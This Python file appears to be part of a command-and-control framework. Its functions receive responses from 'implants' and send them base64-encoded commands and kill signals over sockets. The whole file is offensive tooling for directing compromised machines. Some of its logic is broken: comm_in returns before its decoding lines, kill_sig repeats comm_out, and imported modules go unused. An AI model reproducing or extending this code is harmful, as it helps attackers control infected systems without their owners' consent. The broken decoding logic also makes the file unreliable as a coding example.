import ssl
import base64
import threading
import socket
from config.config_create.create_config_file import config_obj
from config.colours import process,success,error,info
ssl_config = config_obj["SSL"]


def comm_in(targ_id):
    """
    Accepts connection from implants
    :param targ_id:
    :return:
    """

    process("Waiting for Response...")
    return targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

# def tlv_comm_in(targ_id):
#     """
#     Accepts connection from implants
#     :param targ_id:
#     :return:
#     """


def comm_out(targ_id, message):
    """
    Sends commands to implants
    :param targ_id:
    :param message:
    :return:
    """

    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf-8'))
    targ_id.send(message)


def kill_sig(targ_id, message):
    """
    Sends kill command to implants
    :param targ_id:
    :param message:
    :return:
    """

    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf-8'))
    targ_id.send(message)


